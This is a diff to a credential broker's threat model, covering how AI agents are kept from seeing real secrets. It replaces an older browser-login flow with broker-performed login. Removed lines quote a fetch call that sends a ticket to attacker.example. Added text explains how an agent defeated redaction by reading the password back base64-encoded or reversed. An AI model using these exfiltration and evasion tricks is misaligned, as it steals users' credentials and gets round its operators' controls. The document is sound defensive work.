@@ -140,10 +140,12 @@ the agent can also reach the internet directly.
 | Tickets are bound to destination hosts | Each ticket snapshots its secret's allowed hosts at mint: the intersection of the operator's policy file and the secret's in-band `_allowed_hosts` (`packages/core/src/secret-binding.ts`). Unbound secrets get no ticket (`403`) unless `COATCHECK_ALLOW_UNBOUND_SECRETS=1`. At swap time the host is the validated `CONNECT` target on HTTPS (upstream TLS verification makes it the real recipient; `Host` and SNI are ignored) and the WHATWG-parsed URL host on plain HTTP, which only matches `http://` entries, so loopback and private listeners never match unless listed. A mismatch is answered `403` (`X-Coatcheck-Denied: host-mismatch`) and nothing is forwarded; one denied ticket denies the whole request (`TokenStore.replaceAll`, `packages/core/src/mitm.ts`, `packages/core/src/forward.ts`) |
 | Swapping can't redirect a request | On plain HTTP, tickets are swapped only in the path, query and headers, never in the host or userinfo that decide where the request goes (`packages/core/src/forward.ts`) |
 | OAuth refresh can't send `client_secret` elsewhere | The `token_url` host must be one of the secret's allowed hosts, checked before the token endpoint is called; the refreshed ticket inherits the binding (`packages/core/src/vault-handler.ts`) |
-| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`); session-bound tickets 600 s default, 1800 s max (`packages/core/src/vault-handler.ts`) |
+| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`) (`packages/core/src/token-store.ts`) |
 | `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
-| Session-bound (browser) tickets never resolve on HTTP(S) | `TokenStore.replaceAll` skips them (`packages/core/src/token-store.ts`) |
-| Browser login tickets fill only allowed origins | Substituted only in `Input.insertText`, only when the CDP session's committed main-frame origin matches the login secret's allowed hosts; unknown origin or navigation in progress → frame dropped with a CDP error; never substituted in `Runtime.*` (`packages/core/src/cdp/origin-tracker.ts`, `packages/core/src/cdp/substitution.ts`) |
+| No credential ticket ever enters the browser | Broker-performed login: coatcheck fills and submits the form itself over the CDP connection; there is no session-bound credential ticket to leak (`packages/core/src/cdp/login-driver.ts`) |
+| The agent cannot run its own script while a real value is in the page | During the login window coatcheck holds the agent's CDP frames, removes the agent's new-document scripts and reloads to a fresh document, then fills; the agent resumes after the fields are gone or cleared (`packages/core/src/cdp/proxy.ts`, `packages/core/src/cdp/login-driver.ts`) |
+| Broker login fills only allowed origins | The page's committed main-frame origin must match the login secret's allowed hosts; unknown origin, a navigation in progress, or request interception enabled → the login is refused (`403`/`409`) and nothing is filled (`packages/core/src/cdp/origin-tracker.ts`, `packages/core/src/cdp/login-driver.ts`) |
+| Browser echo-back of a real value is redacted | Inbound frames are scanned for each login field value and its percent-, HTML-entity- and JSON-encoded forms, redacted to `[REDACTED:…]`; an unparseable frame still carrying one is dropped (`packages/core/src/cdp/substitution.ts`) |
 | Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`packages/core/src/policy.ts`, `packages/core/src/vault-handler.ts`) |
 | Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `packages/core/src/secret-provider.ts`; `packages/core/src/vault-handler.ts`) |
 | Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`packages/core/src/mitm.ts`) |
@@ -265,38 +267,33 @@ inspected.
 
 ### Browser injection
 
-See `docs/design/cdp-injection.md` for gaps specific to the CDP path:
-script on an allowed origin can read the filled value, cross-origin iframe
-logins, transform-blind redaction, uninspected binary frames. **The first
-and third together mean the v1 flow does not hold against an adversarial
-agent** (confirmed by `examples/agents/browser-login/attack-transform.md`);
-`docs/design/cdp-broker-login.md` (roadmap item 20) is the replacement.
+Fixed by roadmap item 20 (broker-performed login): coatcheck no longer hands
+the agent a credential ticket to fill. The v1 flow let the agent run its own
+script (`page.evaluate`) once its `page.fill()` had put the real value into
+the form, and read it back in a form the literal redactor couldn't recognise
+(base64, reversal, char codes) — confirmed by
+`examples/agents/browser-login/attack-transform.md`. coatcheck now fills and
+submits the form itself over the CDP connection, on a freshly reloaded
+document, with the agent's frames held and its new-document scripts removed,
+so no agent-controlled code runs while the real value is in the page
+(`cdp/login-driver.ts`, `cdp/proxy.ts`). Inbound redaction stays as a backstop
+for browser-produced data and now also matches the browser's percent-, entity-
+and JSON-encoded forms of each value (`cdp/substitution.ts`). Tests:
+`cdp/login-driver.test.ts`, `cdp/proxy.test.ts`, `vault-handler.test.ts`, and
+the Playwright + Chromium `cdp/e2e.test.ts` (which re-runs the four transform
+reads and asserts none yields the password). This removed the v1 outbound
+`Input.insertText` substitution, session-bound tickets, `mint-tokens`, and the
+keystroke detector; see `docs/design/cdp-injection.md` for what each did.
 
-Fixed by roadmap item 15: session-bound login tickets substituted on any
-page, and inside `Runtime.evaluate` / `Runtime.callFunctionOn`, so an agent
-could fill the real password into `https://attacker.example` or run
-`fetch('https://attacker.example/?p=' + 'cct_…')` with the real value.
-Tickets now substitute only in `Input.insertText`, only when the CDP
-session's committed main-frame origin (from `Page.frameNavigated`) is one of
-the login secret's allowed hosts, and never while that origin is unknown or a
-navigation is in progress; otherwise the frame is dropped with a CDP error
-(`cdp/origin-tracker.ts`, `cdp/substitution.ts`; attack tests in
-`cdp/substitution.test.ts`, `cdp/proxy.test.ts`, and the Playwright +
-Chromium `cdp/e2e.test.ts`).
-
-Fixed by roadmap item 14: `mint-tokens` accepted any `sessionId`, so a caller
-could mint credential tickets for a session that didn't exist or had already
-closed. It now requires a live sid from `CdpSessionStore` and answers `404`
-otherwise, before reading the credential (`vault-handler.ts`; attack tests in
-`vault-handler.test.ts`).
-
-Fixed by roadmap item 13: with a valid browser-service API-key ticket, the
-agent could call Browserbase's `/v1/sessions/{id}/debug` and receive raw CDP
-and live-view URLs that never pass through the CDP proxy (no substitution
-gate, no redaction). The adapter now rewrites those URLs to the local proxy or
-removes them, and strips `signingKey`. Remaining second routes: URL shapes the
-adapter doesn't recognise, vendor endpoints outside the adapter hosts, and
-browser-service hosts listed in `COATCHECK_PASSTHROUGH_HOSTS`.
+Fixed by roadmap item 13 and extended by item 20: with a valid browser-service
+API-key ticket, the agent could call Browserbase's `/v1/sessions/{id}/debug`
+and receive raw CDP and live-view URLs that never pass through the CDP proxy
+(no redaction). The adapter rewrites those URLs to the local proxy or removes
+them, strips `signingKey` and `seleniumRemoteUrl` from responses, and (item 20)
+strips browser-extension parameters from session-create request bodies.
+Remaining second routes: URL shapes the adapter doesn't recognise, vendor
+endpoints outside the adapter hosts, and browser-service hosts listed in
+`COATCHECK_PASSTHROUGH_HOSTS`.
 
 ## Residual risk accepted by design
 
@@ -308,3 +305,13 @@ browser-service hosts listed in `COATCHECK_PASSTHROUGH_HOSTS`.
 - **Cleartext fields.** Fields listed in a secret's `_cleartext` are returned
   to the agent as plain values by design; only list non-sensitive data (URLs,
   account ids).
+- **The login site receives the password.** coatcheck performs the login
+  against the real site, which must receive the credential to authenticate;
+  client-side-hashing and challenge logins work because the page's own JS sees
+  the raw value. This is the same upstream-trust boundary as above.
+- **Cross-origin iframe logins and 2FA are out of scope.** Selectors resolve in
+  the main document only; a login whose form is an embedded cross-origin widget
+  is refused. 2FA/OTP flows are not handled.
+- **Binary and screenshot CDP frames are not inspected.** Redaction covers
+  text frames; a screenshot taken outside the login window can capture whatever
+  is rendered.
